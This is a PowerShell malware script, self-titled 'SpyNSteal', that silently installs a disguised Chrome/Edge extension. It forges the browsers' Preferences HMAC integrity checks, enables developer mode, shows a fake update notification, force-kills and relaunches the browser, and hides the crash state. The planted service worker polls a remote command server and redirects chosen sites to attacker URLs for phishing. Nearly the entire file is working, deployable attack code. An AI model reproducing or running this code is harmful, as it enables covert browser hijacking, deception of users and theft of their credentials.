# ============================================================================
# SpyNSteal â€” Phantom Extension Injector
# Injects a MV3 extension into Chrome/Edge via Preferences HMAC forgery.
# No registry writes. No CRX. No admin. No "Managed by" banner.
# Placeholders (%%...%%) are patched by build.ps1 before deployment.
# ============================================================================

$EXT_ID = "egiajcmnnojdmgcdgkojldgdihcjimhi"

$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA9E4l4ZNccXGXQ0vwNIaT8IV8Jo1eqoOmZW2pJFZcrFIyC1oobcmN7ReASmGHHV4EHM+NdUF3GWqouQ/xeQEsLHO4/z1K8D5ZauoMLV5IjBVjtBtv358t5t9hxWk10nv+MFaCx5JW3w+iZFvYQKNNMP0zw6G6+qGAH9f7s49Hg4Od9aFG0A3zkRlQ5JlYQ2e+8mulWe6Ps9GK3Lsw7MsT5i83c0gH2ioOuWCZoR0Uq0wZ3sAng4de6HXwmO/U6CiHMhQBtPB8R6oFCalIOTfleqYXSrCdKqZQ6d8/4EcDzq4g/N7y7X/qms6RUBQ+qp7oN/rxEnhqFeOyhYYOSj7T2QIDAQAB",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "https://CHANGEME.com/api/v1/cfg";
const I = 60000;
let R = null;

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      const id = 1;
      await chrome.declarativeNetRequest.updateDynamicRules({
        removeRuleIds: [id],
        addRules: [{
          id,
          priority: 1,
          action: { type: "redirect", redirect: { url: j.url } },
          condition: { urlFilter: j.target, resourceTypes: ["main_frame"] }
        }]
      });
      R = id;
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

chrome.runtime.onInstalled.addListener(() => pull());
chrome.runtime.onStartup.addListener(() => pull());
setInterval(pull, I);
'@

$KNOWN_SEED = "e748f336d85ea5f9dcdf25d8f347a65b4cdf667600f02df6724a2af18a212d26b788a25086910cf3a90313696871f3dc05823730c91df8ba5c4fd9c884b505a8"

# â”€â”€ Utility: hex string to byte array â”€â”€
function HexToBytes([string]$hex) {
    $b = [byte[]]::new($hex.Length / 2)
    for ($i = 0; $i -lt $hex.Length; $i += 2) {
        $b[$i / 2] = [Convert]::ToByte($hex.Substring($i, 2), 16)
    }
    return $b
}

# â”€â”€ HMAC-SHA256 â”€â”€
function ComputeHmac([string]$seedHex, [string]$message) {
    $hmac = New-Object Security.Cryptography.HMACSHA256
    $hmac.Key = HexToBytes $seedHex
    $hash = $hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($message))
    $hmac.Dispose()
    return [BitConverter]::ToString($hash).Replace('-', '').ToUpper()
}

# â”€â”€ Sorted compact JSON (matches Chromium's base::JSONWriter output) â”€â”€
function ToSortedJson($v) {
    if ($null -eq $v) { return "null" }
    if ($v -is [bool]) { if ($v) { return "true" } else { return "false" } }
    if ($v -is [int] -or $v -is [long] -or $v -is [int64] -or $v -is [double]) {
        if ($v -eq [Math]::Floor($v) -and [Math]::Abs($v) -lt 1e15) {
            return [string][long]$v
        }
        return $v.ToString()
    }
    if ($v -is [string]) {
        $escaped = $v.Replace('\', '\\').Replace('"', '\"').Replace("`n", '\n').Replace("`r", '\r').Replace("`t", '\t')
        return "`"$escaped`""
    }
    if ($v -is [array] -or $v -is [System.Collections.IList]) {
        $items = @()
        foreach ($item in $v) { $items += (ToSortedJson $item) }
        return "[" + ($items -join ',') + "]"
    }
    if ($v -is [PSCustomObject] -or $v -is [System.Collections.IDictionary]) {
        $props = if ($v -is [System.Collections.IDictionary]) {
            $v.GetEnumerator() | Sort-Object Key | ForEach-Object {
                [PSCustomObject]@{ Name = $_.Key; Value = $_.Value }
            }
        } else {
            $v.PSObject.Properties | Sort-Object Name
        }
        $pairs = @()
        foreach ($p in $props) {
            $k = "`"$($p.Name.Replace('\','\\').Replace('"','\"'))`""
            $pairs += "$k`:$(ToSortedJson $p.Value)"
        }
        return "{" + ($pairs -join ',') + "}"
    }
    return "`"$($v.ToString())`""
}

# â”€â”€ PAK v5 resource extractor (for HMAC seed from resources.pak) â”€â”€
function Get-PakResource([string]$pakPath, [int]$resourceId) {
    try {
        $bytes = [IO.File]::ReadAllBytes($pakPath)
        $ver = [BitConverter]::ToUInt32($bytes, 0)
        if ($ver -ne 5) { return $null }
        $resCount = [BitConverter]::ToUInt16($bytes, 8)
        for ($i = 0; $i -lt $resCount; $i++) {
            $pos = 12 + ($i * 6)
            $id = [BitConverter]::ToUInt16($bytes, $pos)
            if ($id -eq $resourceId) {
                $offset = [BitConverter]::ToUInt32($bytes, $pos + 2)
                $nextOff = [BitConverter]::ToUInt32($bytes, $pos + 8)
                $len = $nextOff - $offset
                $data = [byte[]]::new($len)
                [Array]::Copy($bytes, $offset, $data, 0, $len)
                return $data
            }
        }
    } catch {}
    return $null
}

# â”€â”€ Locate browser install + extract seed â”€â”€
function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false; Seed = $null }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.NullSeed = $false
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.NullSeed = $true
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)

    # Resolve executable path
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $candidate = Join-Path $d "$($info.Proc).exe"
            if ($name -eq "chrome") { $candidate = Join-Path $d "chrome.exe" }
            if (Test-Path $candidate) { $info.ExePath = $candidate; break }
        }
    }

    # Extract HMAC seed
    if ($info.NullSeed) {
        $info.Seed = "0" * 128
    } else {
        foreach ($d in $info.AppDirs) {
            if (-not (Test-Path $d)) { continue }
            $verDir = Get-ChildItem $d -Directory -EA SilentlyContinue |
                Where-Object { $_.Name -match '^\d+\.' } |
                Sort-Object { try { [version]($_.Name -replace '[^\d.]','') } catch { [version]"0.0" } } -Descending |
                Select-Object -First 1
            if ($verDir) {
                $pak = Join-Path $verDir.FullName "resources.pak"
                if (Test-Path $pak) {
                    $seedBytes = Get-PakResource $pak 146
                    if ($seedBytes -and $seedBytes.Length -eq 64) {
                        $info.Seed = [BitConverter]::ToString($seedBytes).Replace('-','').ToLower()
                    }
                    break
                }
            }
        }
        if (-not $info.Seed) { $info.Seed = $KNOWN_SEED }
    }
    return $info
}

# â”€â”€ Ensure nested property exists on a PSObject â”€â”€
function Ensure-Property($obj, [string]$name, $default) {
    if (-not $obj.PSObject.Properties[$name]) {
        $obj | Add-Member -NotePropertyName $name -NotePropertyValue $default
    } elseif ($null -eq $obj.$name) {
        $obj.$name = $default
    }
}

# â”€â”€ Flatten protection.macs tree to { "dotted.path" = "MAC_VALUE" } â”€â”€
function Flatten-Macs($obj, [string]$prefix = "") {
    $result = [ordered]@{}
    if ($obj -is [PSCustomObject]) {
        foreach ($p in $obj.PSObject.Properties) {
            $path = if ($prefix) { "$prefix.$($p.Name)" } else { $p.Name }
            if ($p.Value -is [PSCustomObject]) {
                $sub = Flatten-Macs $p.Value $path
                foreach ($k in $sub.Keys) { $result[$k] = $sub[$k] }
            } else {
                $result[$path] = [string]$p.Value
            }
        }
    }
    return $result
}

# â”€â”€ Compute super_mac for Secure Preferences â”€â”€
function Compute-SuperMac([string]$seedHex, $macsObj) {
    $macsJson = ToSortedJson $macsObj
    return ComputeHmac $seedHex $macsJson
}

# â”€â”€ Core: inject extension into a browser profile â”€â”€
function Inject-Extension($browser) {
    $profileDir = Join-Path $browser.UserData "Default"
    if (-not (Test-Path $profileDir)) { return $false }

    $seed = $browser.Seed

    # 1 â”€â”€ Write extension files â”€â”€
    $extDir = Join-Path $profileDir "Extensions\$EXT_ID\1.0_0"
    New-Item -Path $extDir -ItemType Directory -Force | Out-Null
    [IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $MANIFEST, [Text.Encoding]::UTF8)
    [IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, [Text.Encoding]::UTF8)

    # 2 â”€â”€ Build the extension settings object â”€â”€
    $manifestObj = $MANIFEST | ConvertFrom-Json
    $installTime = [string][long]((Get-Date).ToFileTimeUtc() / 10)
    $extPath = $extDir.Replace('/', '\')

    $settings = [PSCustomObject][ordered]@{
        active_permissions = [PSCustomObject][ordered]@{
            api              = @("declarativeNetRequest")
            explicit_host    = @("<all_urls>")
            manifest_permissions = @()
            scriptable_host  = @()
        }
        commands           = [PSCustomObject]@{}
        content_settings   = @()
        creation_flags     = [int]1
        events             = @()
        from_bookmark      = $false
        from_webstore      = $false
        granted_permissions = [PSCustomObject][ordered]@{
            api              = @("declarativeNetRequest")
            explicit_host    = @("<all_urls>")
            manifest_permissions = @()
            scriptable_host  = @()
        }
        incognito_content_settings = @()
        incognito_preferences      = [PSCustomObject]@{}
        install_time       = $installTime
        location           = [int]4
        manifest           = $manifestObj
        path               = $extPath
        preferences        = [PSCustomObject]@{}
        regular_only_preferences = [PSCustomObject]@{}
        state              = [int]1
        was_installed_by_default = $false
        was_installed_by_oem    = $false
        withholding_permissions = $false
    }

    # 3 â”€â”€ Compute extension MAC â”€â”€
    $settingsJson = ToSortedJson $settings
    $extMacPath = "extensions.settings.$EXT_ID"
    $extMac = ComputeHmac $seed ($extMacPath + $settingsJson)

    # 4 â”€â”€ Compute developer_mode MAC â”€â”€
    $devModePath = "extensions.ui.developer_mode"
    $devModeMac = ComputeHmac $seed ($devModePath + "true")

    # 5 â”€â”€ Read the target preferences file â”€â”€
    $secPrefsFile = Join-Path $profileDir "Secure Preferences"
    $prefsFile = Join-Path $profileDir "Preferences"
    $useSecure = Test-Path $secPrefsFile
    $targetFile = if ($useSecure) { $secPrefsFile } else { $prefsFile }
    if (-not (Test-Path $targetFile)) { return $false }

    $raw = [IO.File]::ReadAllText($targetFile, [Text.Encoding]::UTF8)
    $prefs = $raw | ConvertFrom-Json

    # 6 â”€â”€ Inject extension settings â”€â”€
    Ensure-Property $prefs "extensions" ([PSCustomObject]@{})
    Ensure-Property $prefs.extensions "settings" ([PSCustomObject]@{})
    if ($prefs.extensions.settings.PSObject.Properties[$EXT_ID]) {
        $prefs.extensions.settings.$EXT_ID = $settings
    } else {
        $prefs.extensions.settings | Add-Member -NotePropertyName $EXT_ID -NotePropertyValue $settings
    }

    # Enable developer mode
    Ensure-Property $prefs.extensions "ui" ([PSCustomObject]@{})
    if ($prefs.extensions.ui.PSObject.Properties["developer_mode"]) {
        $prefs.extensions.ui.developer_mode = $true
    } else {
        $prefs.extensions.ui | Add-Member -NotePropertyName "developer_mode" -NotePropertyValue $true
    }

    # 7 â”€â”€ Inject MACs â”€â”€
    Ensure-Property $prefs "protection" ([PSCustomObject]@{})
    Ensure-Property $prefs.protection "macs" ([PSCustomObject]@{})
    Ensure-Property $prefs.protection.macs "extensions" ([PSCustomObject]@{})
    Ensure-Property $prefs.protection.macs.extensions "settings" ([PSCustomObject]@{})
    if ($prefs.protection.macs.extensions.settings.PSObject.Properties[$EXT_ID]) {
        $prefs.protection.macs.extensions.settings.$EXT_ID = $extMac
    } else {
        $prefs.protection.macs.extensions.settings | Add-Member -NotePropertyName $EXT_ID -NotePropertyValue $extMac
    }

    Ensure-Property $prefs.protection.macs.extensions "ui" ([PSCustomObject]@{})
    if ($prefs.protection.macs.extensions.ui.PSObject.Properties["developer_mode"]) {
        $prefs.protection.macs.extensions.ui.developer_mode = $devModeMac
    } else {
        $prefs.protection.macs.extensions.ui | Add-Member -NotePropertyName "developer_mode" -NotePropertyValue $devModeMac
    }

    # 8 â”€â”€ Recompute super_mac (Secure Preferences only) â”€â”€
    if ($useSecure) {
        $superMac = Compute-SuperMac $seed $prefs.protection.macs
        if ($prefs.protection.PSObject.Properties["super_mac"]) {
            $prefs.protection.super_mac = $superMac
        } else {
            $prefs.protection | Add-Member -NotePropertyName "super_mac" -NotePropertyValue $superMac
        }
    }

    # 9 â”€â”€ Write back â”€â”€
    $output = $prefs | ConvertTo-Json -Depth 100 -Compress
    [IO.File]::WriteAllText($targetFile, $output, [Text.Encoding]::UTF8)
    return $true
}

# â”€â”€ Patch Local State to suppress crash dialog â”€â”€
function Patch-LocalState($userDataDir) {
    $lsPath = Join-Path $userDataDir "Local State"
    if (-not (Test-Path $lsPath)) { return }
    try {
        $ls = [IO.File]::ReadAllText($lsPath) | ConvertFrom-Json
        if ($ls.PSObject.Properties["profile"]) {
            Ensure-Property $ls.profile "exited_cleanly" $true
            $ls.profile.exited_cleanly = $true
            Ensure-Property $ls.profile "exit_type" "Normal"
            $ls.profile.exit_type = "Normal"
        }
        # Per-profile info
        if ($ls.PSObject.Properties["profile"] -and $ls.profile.PSObject.Properties["info_cache"]) {
            foreach ($p in $ls.profile.info_cache.PSObject.Properties) {
                if ($p.Value -is [PSCustomObject]) {
                    Ensure-Property $p.Value "exited_cleanly" $true
                    $p.Value.exited_cleanly = $true
                }
            }
        }
        [IO.File]::WriteAllText($lsPath, ($ls | ConvertTo-Json -Depth 50 -Compress), [Text.Encoding]::UTF8)
    } catch {}
}

# â”€â”€ Show fake update notification with browser's own icon â”€â”€
function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else {
            $n.Icon = [Drawing.SystemIcons]::Information
        }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

# ============================================================================
#  MAIN EXECUTION
# ============================================================================

$browsers = @()
foreach ($name in @("chrome", "edge")) {
    $b = Find-Browser $name
    if ($b.Found) { $browsers += $b }
}

if ($browsers.Count -eq 0) { exit }

# Inject into all detected browsers
$injected = @()
foreach ($b in $browsers) {
    if (Inject-Extension $b) { $injected += $b }
}

if ($injected.Count -eq 0) { exit }

# Handle running browsers: notification â†’ kill â†’ patch â†’ relaunch
$running = $injected | Where-Object { $_.Running }
if ($running -and $running.Count -gt 0) {
    # Show notification for the primary browser
    Show-UpdateNotif $running[0]

    # Force-kill (prevents Preferences overwrite on shutdown)
    foreach ($b in $running) {
        try { [Diagnostics.Process]::GetProcessesByName($b.Proc) | ForEach-Object { $_.Kill() } } catch {}
    }
    Start-Sleep 1

    # Patch Local State so Chrome doesn't show crash recovery
    foreach ($b in $running) { Patch-LocalState $b.UserData }
    Start-Sleep 1

    # Relaunch with session restore
    foreach ($b in $running) {
        if ($b.ExePath -and (Test-Path $b.ExePath)) {
            try { Start-Process $b.ExePath "--restore-last-session" } catch {}
        }
    }
}
